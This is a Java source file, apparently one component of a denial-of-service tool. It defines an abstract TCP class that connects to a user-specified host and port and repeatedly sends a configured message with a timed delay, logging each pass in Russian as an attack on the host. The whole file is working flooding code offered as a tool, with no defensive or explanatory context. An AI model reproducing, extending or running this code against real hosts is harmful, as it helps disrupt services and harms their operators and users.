package ru.gavrilov.protocols.abstracts;

import ru.gavrilov.common.Controller;
import ru.gavrilov.controllers.DosFormController;
import ru.gavrilov.protocols.entry.DosEntry;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

public abstract class TCP extends DOS {
    private Socket socket;

    public TCP(DosEntry dosEntry, Controller controller) {
        super(dosEntry, controller);
    }

    @Override
    public void run() {
        this.createSocket();
        this.connectToSocket();
        while (!Thread.currentThread().isInterrupted() && (!this.socket.isClosed() && this.socket.isConnected()) &&
                !DosFormController.stopThread) {
            writeLineToSocket(getDosEntry().getMessage());
            getController().appendToLog("Атака хоста " + getDosEntry().getHost() + ":" + getDosEntry().getPort());
            try {
                Thread.sleep(getDosEntry().getTimeoutAttack());
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                e.printStackTrace();
            }
        }
        this.closeSocket();
    }

    public abstract void writeLineToSocket(String message);

    @Override
    protected void createSocket() {
        setAddress(new InetSocketAddress(getDosEntry().getHost(), getDosEntry().getPort()));
        this.socket = new Socket();
        try {
            this.socket.setKeepAlive(true);
            this.socket.setSoTimeout(getDosEntry().getSocketTimeout());
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void connectToSocket() {
        try {
            if (this.socket != null) {
                this.socket.connect(this.getAddress());
            }
        } catch (UnknownHostException ex) {
            getController().appendToLog("Ошибка: Хоста " + getAddress() + " не существует!");
            ex.printStackTrace();
        } catch (SocketException ex) {
            getController().appendToLog("Ошибка при создании или доступе к сокету!");
            closeSocket();
            ex.printStackTrace();
        } catch (IOException ex) {
            getController().appendToLog("Ошибка при создании или доступе к сокету!");
            ex.printStackTrace();
        }
    }

    @Override
    protected void closeSocket() {
        try {
            if (this.socket != null && !this.socket.isClosed() && this.socket.isBound()) {
                socket.close();
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public Socket getSocket() {
        return socket;
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }
}
